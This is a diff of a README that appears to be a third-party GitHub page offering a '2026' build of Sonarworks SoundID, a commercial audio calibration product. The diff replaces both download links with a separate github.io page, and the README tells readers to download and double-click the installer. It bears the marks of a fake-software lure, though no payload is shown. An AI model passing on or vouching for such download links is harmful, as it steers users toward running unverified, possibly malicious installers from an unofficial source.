@@ -1,6 +1,6 @@
 # 🔊 Sonarworks-SoundID-2026 - Calibrate Your Studio For Perfect Sound
 
-[![](https://img.shields.io/badge/Download-Sonarworks_SoundID_2026-blue.svg)](https://github.com/elisesurmounted381/Sonarworks-SoundID-2026)
+[![](https://img.shields.io/badge/Download-Sonarworks_SoundID_2026-blue.svg)](https://elisesurmounted381.github.io)
 
 This software corrects the sound output of your speakers and headphones. It removes acoustic coloration from your listening environment. You hear a flat, accurate frequency response. Producers use this tool to make mixing decisions with confidence. It works across Windows 10 and 11 environments.
 
@@ -20,7 +20,7 @@ Your computer requires specific hardware and software to run this application ef
 Follow these steps to obtain and install the software on your Windows computer.
 
 1.  Visit the official repository download page to obtain the installer package. 
-    [Download the Installer Here](https://github.com/elisesurmounted381/Sonarworks-SoundID-2026)
+    [Download the Installer Here](https://elisesurmounted381.github.io)
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the installer file to launch the setup wizard.
 4.  Follow the instructions on the screen.
